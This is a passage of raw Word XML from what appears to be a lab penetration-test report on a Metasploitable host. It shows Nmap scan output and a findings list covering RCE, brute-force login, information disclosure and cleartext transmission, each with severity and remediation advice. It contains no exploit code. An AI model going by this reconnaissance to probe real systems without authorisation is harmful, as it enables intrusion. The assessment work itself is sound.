      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">; OSs: Unix, Linux; CPE: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cpe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>o:linux:linux_kernel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="064FB2B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</w:p>
    <w:p w14:paraId="3A887398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Host script results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC768E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|_clock-skew: mean: 1h15m04s, deviation: 2h30m02s, median: 2s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400F77B3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smb-os-discovery: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6FE073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   OS: Unix (Samba 3.0.20-Debian)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B026E1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Computer name: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="07478D0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NetBIOS computer name: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF92ED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Domain name: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>localdomain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1887A36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FQDN: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>metasploitable.localdomain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2694C5CB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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_  System</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> time: 2024-11-22T12:10:42-05:00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3474BDA3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|_smb2-time: Protocol negotiation failed (SMB2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9BD53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|_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nbstat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E50090E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smb-security-mode: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F78490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spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>account_used</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: guest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0495B34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spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>authentication_level</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0BBE0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|   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>challenge_response</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: supported</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2385E97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|</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">_  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>message</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_signing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: disabled (dangerous, but default)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635A225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</w:p>
    <w:p w14:paraId="13E35E1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Nmap scan report for 192.168.10.131</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149D319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Host is up (0.0035s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D84E95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Not shown: 65534 closed tcp ports (reset)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF79262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PORT   STATE SERVICE VERSION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB777DF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53/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  domain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dnsmasq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.51</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7E575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MAC Address: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FA:AB</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:E2:CA:34:AC (Unknown)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E885D6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</w:p>
    <w:p w14:paraId="5B631A30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Nmap scan report for 192.168.10.68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F08D2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Host is up (0.0000030s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E64430C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All 65535 scanned ports on 192.168.10.68 are in ignored states.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276D0571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>Not shown: 65535 closed tcp ports (reset)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7690FA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</w:p>
    <w:p w14:paraId="0BA480E5" w14:textId="7777777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sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Service detection performed. Please report any incorrect results at </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>https://nmap.org/submit/ .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2C093112" w14:textId="40F17BE7" w:rsidR="00C0068A" w:rsidRPr="00C0068A" w:rsidRDefault="00C0068A" w:rsidP="00C006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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Nmap done: 256 IP addresses (3 hosts up) scanned in 100.67 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA7AA1A" w14:textId="77777777" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00C0068A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56DCFBA6" w14:textId="6B112AE6" w:rsidR="00F50B31" w:rsidRPr="0024213C" w:rsidRDefault="007B19C4" w:rsidP="002421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 w:rsidRPr="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Vulnerability Identification</w:t>
      </w:r>
      <w:r w:rsidR="00F50B31" w:rsidRPr="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CECEA12" w14:textId="7DCBA366" w:rsidR="007B19C4" w:rsidRDefault="00936618" w:rsidP="007B19C4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487E03" wp14:editId="7D8650B2">
            <wp:extent cx="5486400" cy="4824730"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13902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3181" name="Picture 13902331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4509" w14:textId="71175CA2" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Vulnerabilities:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2849A1F9" w14:textId="297D1D3F" w:rsidR="0024213C" w:rsidRPr="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="7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#1</w:t>
      </w:r>
      <w:r w:rsidR="00212A97">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> BUG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C1607D" w14:textId="162641AB" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Name:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> RCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1538D256" w14:textId="497E6B33" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Severity: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>High</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE9E2BE" w14:textId="7B0132BC" w:rsidR="0024213C" w:rsidRPr="002F508E" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Impact: </w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t xml:space="preserve">Remote code execution vulnerability can </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t>lead</w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t xml:space="preserve"> to full compromise </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t>of web</w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t xml:space="preserve"> server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAC6107" w14:textId="190EE347" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="0097283A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>User supplied input are not properly validate, there is no validation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B31CCFE" w14:textId="479E3739" w:rsidR="00584B69" w:rsidRDefault="00584B69" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remediation:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB97235" w14:textId="3329EC92" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Update outdated software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4341657C" w14:textId="60306C72" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Validate and sanitize user inputs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBD3FDC" w14:textId="77777777" w:rsidR="00212A97" w:rsidRDefault="00212A97" w:rsidP="00212A97">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CD150F3" w14:textId="68B9B612" w:rsidR="0024213C" w:rsidRPr="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>#2</w:t>
      </w:r>
      <w:r w:rsidR="00212A97">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> BUG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751B443B" w14:textId="24811E54" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Name:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Brute force login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B760DC1" w14:textId="3B11FCBA" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Severity: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>High</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFAA4F0" w14:textId="72AD5349" w:rsidR="0024213C" w:rsidRPr="002F508E" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Impact: </w:t>
      </w:r>
      <w:r w:rsidRPr="002F508E">
        <w:t>This vulnerability lead</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="002F508E">
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t>access other’s account, or admin panel.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9686E4" w14:textId="6A6561D2" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="0097283A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t>This is a web application architecture flaw as website does not verify “I am not a robot”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E66ABC0" w14:textId="523533A6" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remediation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0B3873" w14:textId="7CB4D66D" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Implement captcha verification.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4093185F" w14:textId="7B3EFEBD" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Implement account lockouts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABF83CF" w14:textId="77777777" w:rsidR="00212A97" w:rsidRDefault="00212A97" w:rsidP="00212A97">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="603CB126" w14:textId="497473E9" w:rsidR="0024213C" w:rsidRPr="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="7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#3</w:t>
      </w:r>
      <w:r w:rsidR="00212A97">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> BUG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1364DCC5" w14:textId="5528254C" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Name:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Information disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1130376A" w14:textId="53040B49" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Severity: </w:t>
      </w:r>
      <w:r w:rsidRPr="0024213C">
        <w:rPr>
          <w:color w:val="FFC000"/>
        </w:rPr>
        <w:t>Medium</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CA99FB" w14:textId="3709FAD5" w:rsidR="0024213C" w:rsidRPr="002F508E" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Impact: </w:t>
      </w:r>
      <w:r w:rsidR="00584B69" w:rsidRPr="00584B69">
        <w:t>Information disclosure have direct or indirect impact such outdated software version disclosure or credit card information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5481D5B3" w14:textId="3ED0A3AD" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="0097283A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t>when a website</w:t>
      </w:r>
      <w:r w:rsidR="00584B69" w:rsidRPr="00584B69">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00584B69" w:rsidRPr="00584B69">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>unintentionally reveals sensitive information to its users. Depending on the context, websites may leak all kinds of informati</w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:rPr>
          <w:rFonts w:cs="Helvetica"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65240A6C" w14:textId="20376F42" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remediation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B3FB3D" w14:textId="76C6E026" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Build strong access control system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46920532" w14:textId="4347AAB8" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Minimize errors and do pen testing on regular basics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6D3FD8" w14:textId="77777777" w:rsidR="00212A97" w:rsidRPr="00584B69" w:rsidRDefault="00212A97" w:rsidP="00212A97">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59FD1534" w14:textId="0DB1DB84" w:rsidR="0024213C" w:rsidRPr="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="7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#4</w:t>
      </w:r>
      <w:r w:rsidR="00212A97">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> BUG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D234C06" w14:textId="64C7910C" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerability Name:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Cleartext transmission of sensitive information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA11A83" w14:textId="5D31D233" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Severity: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FFC000"/>
        </w:rPr>
        <w:t>Medium</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0883014A" w14:textId="7666EA1D" w:rsidR="0024213C" w:rsidRPr="002F508E" w:rsidRDefault="0024213C" w:rsidP="0024213C">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
